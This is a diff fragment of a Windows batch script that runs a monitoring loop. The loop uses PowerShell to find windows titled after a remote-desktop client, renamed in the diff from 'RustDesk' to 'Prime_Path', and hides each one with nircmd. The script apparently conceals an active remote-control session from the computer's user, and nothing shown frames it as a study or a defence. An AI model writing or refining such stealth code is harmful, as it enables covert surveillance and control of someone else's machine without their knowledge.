@@ -13,9 +13,11 @@ if not exist "%nircmdPath%" (
     del "%tempZip%" >nul 2>&1
 )
 
-:: === MONITOR LOOP TO HIDE RUSTDESK WINDOWS ===
+:: === MONITOR LOOP TO HIDE PRIME_PATH WINDOWS ===
 :loop
-for /f "usebackq tokens=*" %%A in (powershell -NoProfile -Command "Get-Process | Where-Object { $_.MainWindowTitle -like '*RustDesk*' } | Select-Object -ExpandProperty MainWindowTitle") do (
+for /f "usebackq tokens=*" %%A in (`
+    powershell -NoProfile -Command "Get-Process | Where-Object { $_.MainWindowTitle -like '*Prime_Path*' } | Select-Object -ExpandProperty MainWindowTitle"
+`) do (
     set "title=%%A"
     if not "!title!"=="" (
         "%nircmdPath%" win hide title "!title!" >nul 2>&1
